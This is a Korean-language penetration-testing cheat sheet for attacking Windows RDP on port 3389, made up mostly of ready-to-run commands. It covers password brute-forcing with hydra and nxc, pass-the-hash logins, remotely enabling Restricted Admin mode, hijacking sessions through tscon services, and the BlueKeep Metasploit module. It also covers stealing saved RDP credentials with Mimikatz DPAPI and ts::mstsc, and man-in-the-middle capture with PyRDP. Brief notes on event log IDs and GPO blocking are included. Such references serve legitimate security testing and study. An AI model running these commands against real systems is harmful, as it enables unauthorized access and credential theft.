# RDP (3389)

Remote Desktop Protocol. Windows 원격 데스크톱 접속.

---

## 열거

```bash
nmap -sV -sC -p 3389 TARGET
nmap --script=rdp-enum-encryption,rdp-ntlm-info -p 3389 TARGET
```

---

## 접속

```bash
# xfreerdp
xfreerdp /v:TARGET /u:user /p:pass /cert-ignore /dynamic-resolution

# NTLM Hash (Restricted Admin Mode 필요)
xfreerdp /v:TARGET /u:user /pth:NTHASH /cert-ignore

# 클립보드 & 드라이브 공유
xfreerdp /v:TARGET /u:user /p:pass /cert-ignore +clipboard /drive:share,/tmp

# rdesktop
rdesktop TARGET -u user -p pass -g 1920x1080
```

---

## 인증 공격

```bash
# Hydra
hydra -l user -P passwords.txt rdp://TARGET -t 4

# nxc
nxc rdp TARGET -u users.txt -p 'Password1!' --continue-on-success

# 주의: NLA(Network Level Authentication)이 활성화되면 brute force 시 계정 잠금 발생 가능
```

---

## 공격

### Restricted Admin Mode

```bash
# Restricted Admin 활성화 여부 확인 (레지스트리)
# HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0

# Pass-the-Hash로 RDP 접속
xfreerdp /v:TARGET /u:admin /pth:NTHASH /cert-ignore

# 원격으로 Restricted Admin 활성화
nxc smb TARGET -u admin -H HASH -x "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
```

### RDP Session Hijacking

```powershell
# 관리자 권한으로 다른 사용자의 RDP session 탈취
# session 목록 확인
query user

# SYSTEM 권한으로 session 연결 (비밀번호 불필요)
tscon SESSION_ID /dest:rdp-tcp#0
# 또는 서비스로 실행
sc create rdphijack binpath="cmd.exe /k tscon SESSION_ID /dest:rdp-tcp#0" start=demand
net start rdphijack
```

### RDP 키로깅/캡처

```bash
# SharpRDP - RDP를 통한 원격 명령 실행 (GUI 없이)
SharpRDP.exe computername=TARGET command="whoami" username=DOMAIN\user password=pass
```

---

## BlueKeep (CVE-2019-0708)

```bash
# 취약점 확인
nmap --script=rdp-vuln-ms12-020 -p 3389 TARGET

# Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

---

## 유의사항

!!! tip "RDP 접속 시 로그"
    - Security 이벤트 로그: 4624 (Type 10 = RemoteInteractive)
    - TerminalServices-RemoteConnectionManager: 1149
    - TerminalServices-LocalSessionManager: 21, 22

---

## 저장된 RDP credential 탈취

### .rdp 파일 / Credential Manager

```powershell
# 저장된 RDP 히스토리
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default"
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

# 저장된 .rdp 파일
Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.rdp -Force

# Credential Manager 에 저장된 "TERMSRV/..." credential (DPAPI 암호화)
cmdkey /list | Select-String TERMSRV
```

### Mimikatz 로 복호화

```text
# DPAPI 마스터키 추출 (사용자 컨텍스트)
privilege::debug
sekurlsa::dpapi           # LSASS 에서 masterkey 추출

# credential blob 복호화
dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<GUID>
dpapi::cred /in:... /masterkey:<MASTERKEY>

# 실행 중인 mstsc 에서 평문 추출
ts::mstsc                 # 현재 session의 mstsc 프로세스에서 패스워드 긁기
```

---

## PyRDP MITM

조건: 공격자가 target과 RDP 서버 사이 경로(ARP spoofing, DNS hijack, 사내 man-in-the-middle 등)를 가질 때.

```bash
# PyRDP - 투명 MITM 프록시 (키 입력 / 클립보드 / 파일 / 크리덴셜 캡처)
pyrdp-mitm.py RDP_SERVER_IP
pyrdp-mitm.py RDP_SERVER_IP -o /tmp/pyrdp --no-replay

# 저장 위치
# /tmp/pyrdp/replays/     - session 리플레이 (Shadow 재생)
# /tmp/pyrdp/files/       - 클립보드/드라이브 전송 파일
# pyrdp-mitm.log          - 입력된 credential 평문

# session 재생
pyrdp-player.py replay.pyrdp
```

---

## 클립보드 하이재킹

```text
# RDP 클립보드는 기본 양방향. 공격자 호스트에서 target의 클립보드 내용 스니핑 가능
# xfreerdp 에서 클립보드 공유 활성: +clipboard
# PyRDP / ScreenConnect 기반 도구로 클립보드 로깅 가능
```

!!! warning "정책"
    클립보드 / 드라이브 리다이렉션은 GPO `Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services` 에서 차단되어 있으면 사용 불가.